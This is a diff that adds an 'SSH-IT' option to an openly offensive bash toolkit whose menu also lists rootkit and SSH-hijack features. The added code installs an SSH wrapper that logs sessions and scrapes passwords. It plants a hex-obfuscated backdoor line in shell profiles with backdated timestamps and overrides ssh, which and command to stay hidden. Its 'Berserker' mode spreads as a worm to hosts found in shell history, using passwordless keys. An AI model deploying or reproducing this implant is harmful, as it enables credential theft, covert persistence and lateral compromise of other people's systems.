@@ -974,6 +974,286 @@ PROXYEOF6
     sleep 1; clear
 }
 
+sshItMitm(){
+    echo " [*] SSH-IT: PTY MITM Dual-Connection Stealth [*] "
+    echo ""
+
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    BASEDIR="${HOME}/.config/prng"
+    LOGDIR="${BASEDIR}/.d"
+    SESSDIR="${BASEDIR}/.l"
+    SEEDFILE="${BASEDIR}/seed"
+    HOOKSCRIPT="${BASEDIR}/hook.sh"
+    WRAPPERSCRIPT="${BASEDIR}/ssh_wrapper.sh"
+    CLIUTIL="${BASEDIR}/thc_cli"
+    RECHECK_DAYS=14
+    TRY_WAIT_HOURS=12
+    MAX_DEPTH=8
+
+    echo -e "  ${CYAN}[1]${NC} Install SSH-IT implant (full deployment)"
+    echo -e "  ${CYAN}[2]${NC} Inject profile backdoor only"
+    echo -e "  ${CYAN}[3]${NC} View captured credentials & sessions"
+    echo -e "  ${CYAN}[4]${NC} Berserker mode (worm propagation)"
+    echo -e "  ${CYAN}[5]${NC} Implant status check"
+    echo -e "  ${CYAN}[6]${NC} Target specific user"
+    echo -e "  ${CYAN}[7]${NC} Cleanup / Uninstall"
+    echo ""
+    read -p "Choice [1-7]: " OPT
+
+    case "$OPT" in
+        1)
+            echo -e "${CYAN}[*] Installing SSH-IT implant...${NC}"
+            mkdir -p "$BASEDIR" "$LOGDIR" "$SESSDIR" 2>/dev/null
+            chmod 700 "$BASEDIR"
+
+            ORIG_SSH=$(command -v ssh 2>/dev/null || echo "/usr/bin/ssh")
+
+            # Create SSH wrapper
+            cat > "$WRAPPERSCRIPT" << 'SSHWRAP'
+#!/bin/bash
+THC_BASEDIR="${THC_BASEDIR:-$HOME/.config/prng}"
+THC_TARGET="${THC_TARGET:-/usr/bin/ssh}"
+THC_LOGDIR="${THC_BASEDIR}/.d"
+THC_SESSDIR="${THC_BASEDIR}/.l"
+THC_PS_NAME="${THC_PS_NAME:--bash}"
+
+parse_ssh_dest() {
+    local last_arg="" skip_next=0
+    for arg in "$@"; do
+        if [[ $skip_next -eq 1 ]]; then skip_next=0; continue; fi
+        case "$arg" in -[bcDeFIiJLlmOopQRSWw]) skip_next=1 ;; -*) ;; *) last_arg="$arg" ;; esac
+    done
+    echo "$last_arg"
+}
+
+filter_ssh_args() {
+    local -a filtered=()
+    local skip_next=0
+    for arg in "$@"; do
+        if [[ $skip_next -eq 1 ]]; then skip_next=0; continue; fi
+        case "$arg" in -[LRDWw]) skip_next=1 ;; -t|-tt) ;; *) filtered+=("$arg") ;; esac
+    done
+    echo "${filtered[@]}"
+}
+
+SSH_DEST="$(parse_ssh_dest "$@")"
+[[ -z "$SSH_DEST" ]] && exec "$THC_TARGET" "$@"
+
+HOSTID=$(echo -n "$SSH_DEST" | md5sum | cut -d' ' -f1)
+HOSTDB="${THC_LOGDIR}/.host_${HOSTID}"
+if [[ -f "$HOSTDB" ]]; then
+    LAST_TS=$(cat "$HOSTDB" 2>/dev/null); NOW_TS=$(date +%s)
+    DAYS_SINCE=$(( (NOW_TS - LAST_TS) / 86400 ))
+    [[ $DAYS_SINCE -lt ${THC_RECHECK_DAYS:-14} ]] && exec "$THC_TARGET" "$@"
+fi
+
+FILTERED_ARGS=$(filter_ssh_args "$@")
+INFIL_LOG="${THC_LOGDIR}/infil_${HOSTID}.log"
+( exec -a "$THC_PS_NAME" "$THC_TARGET" $FILTERED_ARGS -T "$SSH_DEST" \
+    "echo THCINSIDE && id && echo THCFINISHED" > "$INFIL_LOG" 2>&1 ) &
+INFIL_PID=$!
+sleep 1
+
+CRED_LOG="${THC_LOGDIR}/ssh-${SSH_DEST//[^a-zA-Z0-9@._-]/_}.pwd"
+SESS_LOG="${THC_SESSDIR}/sess_$(date +%s)_${HOSTID}.log"
+TEMPSCRIPT=$(mktemp /tmp/.ssh_XXXXXX)
+cat > "$TEMPSCRIPT" << INNEREOF
+#!/bin/bash
+exec -a "$THC_PS_NAME" "$THC_TARGET" "\$@"
+INNEREOF
+chmod 700 "$TEMPSCRIPT"
+script -qfc "$TEMPSCRIPT $*" "$SESS_LOG" 2>/dev/null
+SSH_RET=$?
+[[ -f "$SESS_LOG" ]] && grep -a -i "password" "$SESS_LOG" | head -5 >> "$CRED_LOG" 2>/dev/null
+date +%s > "$HOSTDB" 2>/dev/null
+rm -f "$TEMPSCRIPT" 2>/dev/null; kill "$INFIL_PID" 2>/dev/null; wait "$INFIL_PID" 2>/dev/null
+exit $SSH_RET
+SSHWRAP
+            chmod 700 "$WRAPPERSCRIPT"
+
+            # Create hook.sh
+            cat > "$HOOKSCRIPT" << 'HOOKEOF'
+#!/bin/bash
+THC_BASEDIR="${THC_BASEDIR:-$HOME/.config/prng}"
+THC_DEPTH="${THC_DEPTH:-8}"
+[[ "$THC_DEPTH" -le 0 ]] && { echo "THCFINISHED"; exit 0; }
+mkdir -p "${THC_BASEDIR}" "${THC_BASEDIR}/.d" "${THC_BASEDIR}/.l" 2>/dev/null
+chmod 700 "${THC_BASEDIR}"
+echo "THCINSIDE"
+SEED_PATH="${THC_BASEDIR}/seed"
+HEX_PATH=$(echo -n "$SEED_PATH" | xxd -ps 2>/dev/null || echo -n "$SEED_PATH" | od -An -tx1 | tr -d ' \n')
+for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
+    if [[ -f "$PROFILE" ]]; then
+        if ! grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
+            ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)
+            echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." >> "$PROFILE"
+            echo "source \"\$(echo ${HEX_PATH}|xxd -r -ps 2>/dev/null)\" 2>/dev/null #PRNGD" >> "$PROFILE"
+            [[ -n "$ORIG_TS" ]] && touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
+        fi
+        break
+    fi
+done
+echo "THCPROFILE"; echo "THCFINISHED"
+HOOKEOF
+            chmod 700 "$HOOKSCRIPT"
+
+            # Create seed file
+            cat > "$SEEDFILE" << SEEDEOF
+#!/bin/bash
+THC_BASEDIR="${BASEDIR}"
+THC_ORIG_SSH="${ORIG_SSH}"
+ssh() {
+    if [[ -f "\${THC_BASEDIR}/ssh_wrapper.sh" ]]; then
+        THC_TARGET="\$THC_ORIG_SSH" THC_BASEDIR="\$THC_BASEDIR" "\${THC_BASEDIR}/ssh_wrapper.sh" "\$@"
+    else \$THC_ORIG_SSH "\$@"; fi
+}
+scp() { \$THC_ORIG_SSH "\$@" 2>&1 | tee -a "\${THC_BASEDIR}/.l/scp_\$(date +%s).log"; }
+which() {
+    unset -f ssh scp which command 2>/dev/null
+    command which "\$@"; local ret=\$?
+    source "\${THC_BASEDIR}/seed" 2>/dev/null; return \$ret
+}
+command() {
+    case "\$1" in
+        -v|-V) unset -f ssh scp which command 2>/dev/null
+            builtin command "\$@"; local ret=\$?
+            source "\${THC_BASEDIR}/seed" 2>/dev/null; return \$ret ;;
+        *) builtin command "\$@" ;;
+    esac
+}
+export -f ssh 2>/dev/null
+SEEDEOF
+            chmod 700 "$SEEDFILE"
+
+            # Inject profile
+            local HEX_PATH2
+            if command -v xxd &>/dev/null; then
+                HEX_PATH2=$(echo -n "$SEEDFILE" | xxd -ps)
+            else
+                HEX_PATH2=$(echo -n "$SEEDFILE" | od -An -tx1 | tr -d ' \n')
+            fi
+            for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
+                if [[ -f "$PROFILE" ]]; then
+                    if ! grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
+                        local ORIG_TS; ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)
+                        echo "" >> "$PROFILE"
+                        echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." >> "$PROFILE"
+                        echo "source \"\$(echo ${HEX_PATH2}|xxd -r -ps 2>/dev/null)\" 2>/dev/null #PRNGD" >> "$PROFILE"
+                        [[ -n "$ORIG_TS" ]] && touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
+                        echo -e "${GREEN}  [+] Injected into ${PROFILE}${NC}"
+                    fi
+                    break
+                fi
+            done
+            echo -e "${GREEN}[+] SSH-IT implant installed!${NC}"
+            ;;
+        2)
+            echo -e "${CYAN}[*] Injecting profile backdoor...${NC}"
+            local HEX_PATH2
+            if command -v xxd &>/dev/null; then
+                HEX_PATH2=$(echo -n "${BASEDIR}/seed" | xxd -ps)
+            else
+                HEX_PATH2=$(echo -n "${BASEDIR}/seed" | od -An -tx1 | tr -d ' \n')
+            fi
+            for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
+                if [[ -f "$PROFILE" ]] && ! grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
+                    local ORIG_TS; ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)
+                    echo "" >> "$PROFILE"
+                    echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." >> "$PROFILE"
+                    echo "source \"\$(echo ${HEX_PATH2}|xxd -r -ps 2>/dev/null)\" 2>/dev/null #PRNGD" >> "$PROFILE"
+                    [[ -n "$ORIG_TS" ]] && touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
+                    echo -e "${GREEN}  [+] Injected into ${PROFILE}${NC}"
+                fi
+            done
+            ;;
+        3)
+            echo -e "${CYAN}[*] Captured Credentials:${NC}"
+            for f in "$LOGDIR"/*.pwd; do
+                [[ -f "$f" ]] || continue
+                echo "── $(basename "$f") ──"; cat "$f"; echo ""
+            done
+            echo -e "${CYAN}[*] Session Logs:${NC}"
+            ls -lt "$SESSDIR"/*.log 2>/dev/null | head -10
+            echo -e "${CYAN}[*] Infiltrated Hosts:${NC}"
+            for f in "$LOGDIR"/.host_*; do
+                [[ -f "$f" ]] || continue
+                echo "Host: $(basename "$f" | sed 's/.host_//') | Last: $(date -d "@$(cat "$f")" 2>/dev/null)"
+            done
+            ;;
+        4)
+            echo -e "${RED}[!] BERSERKER MODE — Worm Propagation${NC}"
+            read -p "Are you sure? (yes/no): " CONFIRM
+            [[ "$CONFIRM" != "yes" ]] && { echo "Aborted."; return; }
+            read -p "Max depth [default: ${MAX_DEPTH}]: " DEPTH_INPUT
+            DEPTH_INPUT="${DEPTH_INPUT:-$MAX_DEPTH}"
+            local -a TARGETS=()
+            for hf in "$HOME/.bash_history" "$HOME/.zsh_history"; do
+                [[ -f "$hf" ]] || continue
+                while IFS= read -r line; do TARGETS+=("$line"); done < <(
+                    grep -E '^ssh[[:space:]]' "$hf" 2>/dev/null | \
+                    sed 's/^.*ssh[[:space:]]\+//' | \
+                    grep -oE '[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+' | sort -u)
+            done
+            local -a KEYS=()
+            for keyfile in "$HOME/.ssh"/id_*; do
+                [[ -f "$keyfile" && "$keyfile" != *.pub ]] || continue
+                ssh-keygen -y -P "" -f "$keyfile" &>/dev/null && KEYS+=("$keyfile")
+            done
+            [[ ${#KEYS[@]} -eq 0 ]] && { echo "No passwordless keys found."; return; }
+            for target in "${TARGETS[@]}"; do
+                for key in "${KEYS[@]}"; do
+                    if ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
+                        -T "$target" "echo THCTEST" 2>/dev/null | grep -q "THCTEST"; then
+                        echo -e "${GREEN}[+] Infiltrating: ${target}${NC}"
+                        ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=no \
+                            -T "$target" "THC_DEPTH=${DEPTH_INPUT} bash" < "$HOOKSCRIPT" 2>/dev/null
+                        break
+                    fi
+                done
+            done
+            ;;
+        5)
+            echo -e "${CYAN}[*] SSH-IT Status:${NC}"
+            [[ -d "$BASEDIR" ]] && echo -e "  Base: ${GREEN}EXISTS${NC}" || echo -e "  Base: ${RED}MISSING${NC}"
+            [[ -f "$WRAPPERSCRIPT" ]] && echo -e "  Wrapper: ${GREEN}OK${NC}" || echo -e "  Wrapper: ${RED}MISSING${NC}"
+            [[ -f "$SEEDFILE" ]] && echo -e "  Seed: ${GREEN}OK${NC}" || echo -e "  Seed: ${RED}MISSING${NC}"
+            for p in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
+                [[ -f "$p" ]] && grep -q "PRNGD" "$p" 2>/dev/null && echo -e "  Profile: ${GREEN}ACTIVE${NC} ($p)"
+            done
+            echo "  Creds: $(find "$LOGDIR" -name '*.pwd' 2>/dev/null | wc -l)"
+            echo "  Sessions: $(find "$SESSDIR" -name '*.log' 2>/dev/null | wc -l)"
+            ;;
+        6)
+            read -p "Target username: " TARGET_USER
+            id "$TARGET_USER" &>/dev/null || { echo "User not found."; return; }
+            local TARGET_HOME; TARGET_HOME=$(eval echo "~${TARGET_USER}")
+            local TB="${TARGET_HOME}/.config/prng"
+            mkdir -p "${TB}/.d" "${TB}/.l" 2>/dev/null; chmod 700 "$TB"
+            [[ -f "$WRAPPERSCRIPT" ]] && cp "$WRAPPERSCRIPT" "${TB}/ssh_wrapper.sh"
+            [[ -f "$HOOKSCRIPT" ]] && cp "$HOOKSCRIPT" "${TB}/hook.sh"
+            chmod 700 "${TB}/ssh_wrapper.sh" "${TB}/hook.sh" 2>/dev/null
+            chown -R "${TARGET_USER}:" "${TB}" 2>/dev/null
+            echo -e "${GREEN}[+] Implant deployed for: ${TARGET_USER}${NC}"
+            ;;
+        7)
+            echo -e "${CYAN}[*] Removing SSH-IT implant...${NC}"
+            for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
+                if [[ -f "$PROFILE" ]] && grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
+                    local ORIG_TS; ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)
+                    sed -i '/PRNGD/d' "$PROFILE"; sed -i '/SEED PRNGD/d' "$PROFILE"
+                    [[ -n "$ORIG_TS" ]] && touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
+                    echo -e "${GREEN}  [+] Cleaned: ${PROFILE}${NC}"
+                fi
+            done
+            unset -f ssh scp which command 2>/dev/null
+            [[ -d "$BASEDIR" ]] && rm -rf "$BASEDIR"
+            echo -e "${GREEN}[+] SSH-IT removed.${NC}"
+            ;;
+        *) echo "[ERROR] Invalid choice" >&2; return 1 ;;
+    esac
+    sleep 1; clear
+}
+
 banner() {
     rainbow "
                                   ,
@@ -1024,6 +1304,7 @@ menu() {
                                   [25] Depmod Stealth (Hide from modules.dep)
                                   [26] Namespace Jail (Container-Based Rootkit)
                                   [27] SSH Tunnel Hijack & Multiplexing Abuse
+                                  [28] SSH-IT: PTY MITM Dual-Connection Stealth
 
     [*] Coming soon others features [*]
 
@@ -1087,6 +1368,8 @@ EOF
         namespaceJail
     elif [ "$MENUINPUT" == "27" ] || [ "$MENUINPUT" == "27" ]; then
         sshTunnelHijack
+    elif [ "$MENUINPUT" == "28" ] || [ "$MENUINPUT" == "28" ]; then
+        sshItMitm
     else 
         echo "This option does not exist"
     fi
